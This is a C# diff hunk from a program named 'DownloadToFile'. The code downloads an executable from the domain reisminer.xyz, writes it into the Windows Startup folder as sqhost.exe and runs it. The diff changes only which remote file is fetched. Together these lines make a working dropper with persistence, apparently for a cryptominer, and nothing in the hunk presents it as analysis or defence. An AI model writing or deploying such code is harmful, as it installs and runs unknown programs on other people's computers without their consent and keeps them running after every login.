@@ -23,7 +23,7 @@ namespace DownloadToFile
             
             //get GetCommand
             Console.WriteLine(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
-            Client.DownloadFile("http://reisminer.xyz/exes/sqhost.exe",
+            Client.DownloadFile("http://reisminer.xyz/exes/GetCommand.exe",
                 Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\sqhost.exe");
             Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\sqhost.exe");
         }
